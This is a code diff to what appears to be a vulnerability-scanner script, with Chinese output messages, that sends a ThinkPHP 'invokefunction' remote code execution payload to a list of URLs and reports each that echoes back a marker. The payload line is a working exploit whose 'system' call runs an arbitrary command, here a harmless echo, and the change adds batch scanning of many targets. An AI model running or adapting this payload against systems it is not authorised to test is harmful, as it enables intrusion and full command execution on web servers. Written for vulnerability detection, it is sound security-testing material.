@@ -1,11 +1,17 @@
-#request url = var
+#request urls = array
 #define payload = /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20wker
-function main(args)
-{
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
-	if(StrFindStr(res[0],"wker",0)!= "-1")
-	{
-		print(url."存在thinkphp远程代码执行");
+function main(args){
+	printclolor("当前正在检测thinkphp远程代码执行",1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		try{
+			res = HttpGet(urls[i].payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
+			if(StrFindStr(res[0],"wker",0)!= "-1"){
+				printclolor("[+]".urls[i]."存在thinkphp远程代码执行",3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
-
 }
